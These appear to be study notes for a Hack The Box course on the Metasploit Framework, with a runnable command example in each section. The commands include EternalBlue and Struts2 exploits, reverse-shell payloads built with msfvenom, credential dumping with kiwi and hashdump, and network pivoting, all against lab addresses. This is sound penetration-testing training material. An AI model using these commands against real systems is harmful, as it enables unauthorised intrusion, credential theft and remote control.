# Using the Metasploit Framework

> Chapter notes based on HTB "Using the Metasploit Framework". Each section includes a summary, observed commands, core concepts, usage tips, and examples.

---

## 1. Introduction to Metasploit
- Summary: Overview of framework structure (msfconsole, modules, payloads, encoders), typical workflow, and lab-safety guidelines.
- Observed commands:
  - msfconsole
  - help, search, info, use, set, show options, run, exploit, back, exit
- Concepts:
  - Modules: auxiliary, exploit, post, payload, encoder, nop, evasion
  - Datastores: global vs module options
  - Targets and payload compatibility
- Practical tips:
  - Use a dedicated lab. Update modules regularly: msfupdate or apt update metasploit-framework
  - Tab-complete options; use show advanced for extra settings
  - Use setg to persist global RHOSTS/LHOST
- Examples:
```bash
msfconsole
search smb
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
check
exploit
```

## 2. Module Taxonomy and Selection
- Summary: Identify correct module types and pick reliable exploits.
- Observed commands: search <term>, info <module>, show targets, show payloads
- Concepts:
  - Rank: excellent, great, good, normal, average, low, manual
  - Target IDs vs auto-targeting
- Tips:
  - Prefer higher-ranked modules; read References and DisclosureDate
  - Cross-check module docs and CVE
- Example:
```bash
search type:exploit platform:windows smb ms17_010
use 0
info
show targets
show payloads
```

## 3. Workspace, Projects, and Databases
- Summary: Organize engagements with workspaces and loot management using msfdb.
- Observed commands: db_status, workspace -a redteam, workspace redteam, hosts, services, notes
- Concepts: PostgreSQL backend, data persistence, loot storage
- Tips: Enable db for automation; export results
- Example:
```bash
msfdb init
msfconsole
workspace -a htb_lab
workspace htb_lab
db_status
hosts
services
```

## 4. Discovery and Scanning
- Summary: Use auxiliary scanners and integrate with Nmap.
- Observed commands: use auxiliary/scanner/*, set RHOSTS, RPORT, THREADS; db_nmap
- Concepts: RHOSTS syntax (CIDR, ranges, files), THREADS concurrency
- Tips: Start wide, then pivot to targeted checks
- Example:
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 1-1000
set THREADS 64
run

db_nmap -sV -O 10.10.10.5
services -u
```

## 5. Exploitation Workflow
- Summary: From enumeration to exploitation with correct payloads and session handling.
- Observed commands: set PAYLOAD, set LHOST/LPORT, set TARGET, exploit -j, run -j, check
- Concepts: staged (windows/meterpreter/reverse_tcp) vs stageless (windows/meterpreter_reverse_tcp) payloads; listener jobs
- Tips: Use exploit -j to run in background; prefer reliable payloads for firewalled networks
- Example:
```bash
use exploit/multi/http/struts2_content_type_ognl
set RHOSTS 10.10.10.23
set TARGET 0
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
check
exploit -j
jobs
```

## 6. Meterpreter Basics
- Summary: Interact with sessions, migrate, collect creds, and maintain stability.
- Observed commands: sessions, sessions -i 1, background, sysinfo, getuid, ps, migrate, shell, upload, download
- Concepts: In-memory payload, channels, transport resilience
- Tips: Migrate into a stable process; use background to return to msfconsole
- Example:
```bash
sessions
sessions -i 1
sysinfo
getuid
ps | grep explorer
migrate 1234
shell
whoami
exit
```

## 7. Post-Exploitation Modules
- Summary: Leverage post/* modules for privilege escalation, cred dumping, and enumeration.
- Observed commands: use post/windows/gather/credentials/*, getsystem, hashdump, kiwi
- Concepts: Privilege escalation techniques, credential artifacts
- Tips: Run getsystem carefully; prefer post modules before manual actions
- Example:
```bash
use post/windows/gather/credentials/credential_collector
set SESSION 1
run
load kiwi
kiwi_cmd sekurlsa::logonpasswords
hashdump
```

## 8. Pivoting and Routing
- Summary: Route traffic via compromised hosts and socks proxies.
- Observed commands: route add, route print, use auxiliary/server/socks_proxy, set SRVPORT
- Concepts: Network pivoting, proxychains integration
- Tips: Verify with ping/portscan through routes; limit scope
- Example:
```bash
route add 10.10.20.0 255.255.255.0 1
route print
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run
# local /etc/proxychains.conf -> socks5 127.0.0.1 1080
```

## 9. Loot, Creds, and Reporting
- Summary: Manage gathered files, passwords, and create artifacts.
- Observed commands: loot, creds, notes, services -o report.csv
- Concepts: Data hygiene, export formats
- Tips: Tag and export regularly; sanitize sensitive data
- Example:
```bash
loot
creds
notes -a "Found admin panel on 10.10.10.23"
services -o services.csv
```

## 10. Custom Payloads and Encoders
- Summary: Generate payloads, use encoders, and AV evasion basics.
- Observed commands: msfvenom -l payloads, -l encoders, -p, -f, -o, -e, -i
- Concepts: Staged vs stageless payloads, bad chars, templates
- Tips: Test payloads in lab; avoid over-encoding
- Example:
```bash
msfvenom -l payloads | grep meterpreter
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o agent.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o shell.elf
```

## 11. Automation and Scripting
- Summary: Resource scripts and RPC for repeatability.
- Observed commands: makerc, msfconsole -r script.rc, load db
- Concepts: .rc files, automation of multi-step workflows
- Tips: Create engagement-specific .rc files
- Example script.rc:
```rc
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.10.10.0/24
set PORTS 1-1000
set THREADS 64
run
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
set LHOST 10.10.14.5
exploit -j
```

## 12. Safety, Ethics, and Troubleshooting
- Summary: Operate legally, minimize impact, and debug issues.
- Observed commands: set VERBOSE true, set Proxies, set SSL true, set RPORT, set HttpClientTimeout
- Concepts: Idempotence, safe checks, non-destructive enumeration
- Tips: Use check before exploit; snapshot VMs; throttle THREADS
- Example diagnostics:
```bash
setg VERBOSE true
setg HttpClientTimeout 20
setg Proxies http:127.0.0.1:8080
check
run
```

---

References
- Metasploit Unleashed (OffSec)
- Rapid7 Metasploit Docs
- HTB Academy: Using the Metasploit Framework
